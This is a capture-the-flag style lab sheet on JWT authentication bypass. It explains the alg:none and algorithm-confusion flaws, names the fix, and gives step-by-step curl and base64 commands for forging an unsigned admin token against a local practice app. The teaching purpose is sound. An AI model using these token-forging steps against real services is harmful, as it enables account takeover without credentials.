# jwt-auth-bypass

## Concepts

A **JSON Web Token (JWT)** is a signed token a server hands a client after login; the client sends it
back on every request to prove who they are. It carries **claims** (like `role=user`) in plaintext,
plus a **signature** that's supposed to guarantee the server issued it. A **JWT bypass** happens when
the server verifies that signature incorrectly — so an attacker can forge a token with any claims they
like, such as `role=admin`.

- **Why it matters.** JWTs are the backbone of auth in modern APIs. Defeat the signature check and you
  become any user — including an admin — with no password. It's an *Identification and Authentication
  Failures* issue in the OWASP Top 10, and usually means instant account takeover.
- **Structure.** A JWT is three Base64url parts: `header.payload.signature`. The header names the
  signing algorithm (`alg`); the payload holds the claims.
- **Two classic flaws:**
  1. **`alg: none`.** If the server honours `{"alg":"none"}`, it skips signature verification
     entirely. Edit the payload to `role=admin`, set `alg` to `none`, drop the signature — accepted.
  2. **Algorithm confusion (RS256 → HS256).** The server verifies with an RSA *public* key (not
     secret). Switch the header to HS256 and some libraries use that public key as the HMAC secret;
     since you know it, you can sign a valid token yourself.
- **The fix.** **Pin the expected algorithm server-side** (never trust the header's `alg`) and
  **reject `none`**.

This lab's `/admin` verifier trusts the header's `alg` and accepts `none`.

## Tasks

Start the lab with `./lab up jwt-auth-bypass`, then open a shell: `./lab shell jwt-auth-bypass`.
Quillpad runs at `http://127.0.0.1:8080` — drive it with `curl`.

1. **Recon** — log in and decode your token:
   ```
   curl -s -X POST http://127.0.0.1:8080/login -d 'username=alice'
   # split the token on '.' and decode the payload (2nd part):
   echo '<payload-part>' | base64 -d ; echo
   ```
   Note `header.alg` and the `role` claim. A normal token on the admin endpoint is rejected:
   ```
   curl -s -H "Authorization: Bearer <your-token>" http://127.0.0.1:8080/admin   # 403
   ```
2. **Exploit** — forge a token with `alg:none` and `role=admin`, signature dropped, then call
   `/admin`. Base64url-encode (strip `=` padding, `+/`→`-_`) a `none` header and an admin payload:
   ```
   H=$(printf '%s' '{"alg":"none","typ":"JWT"}'  | base64 -w0 | tr '+/' '-_' | tr -d '=')
   P=$(printf '%s' '{"sub":"alice","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
   curl -s -H "Authorization: Bearer ${H}.${P}." http://127.0.0.1:8080/admin
   ```
   (The trailing `.` is the empty signature.)
3. **Capture the flag** — the accepted admin token makes the server write it; confirm:
   ```
   cat /flag/solved
   ```
4. **Record your findings** in `/root/answers.txt` (`VULN_ALG`, `FORGED_CLAIM`, `FIX`).

Check your work from the host: `./lab check jwt-auth-bypass`.

<details>
<summary>Hints</summary>

- JWT uses **base64url** (not standard base64): translate `+/` to `-_` and remove `=` padding.
- The forged token is just `base64url(header).base64url(payload).` — header `{"alg":"none"}`, payload
  with `role:admin`, and **nothing** after the last dot.
- To decode a part that's missing padding: `echo "$part==" | tr '_-' '/+' | base64 -d`.
- For the fix, any of: pin/allow-list the algorithm server-side, reject `none`, don't trust the
  header's `alg`.

</details>

## My notes

<!-- Screenshots: ./lab shot jwt-auth-bypass ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `sqli-auth-bypass` — bypassing a login a different way (injecting into the SQL query).
- `reflected-xss` — stealing a session rather than forging one.
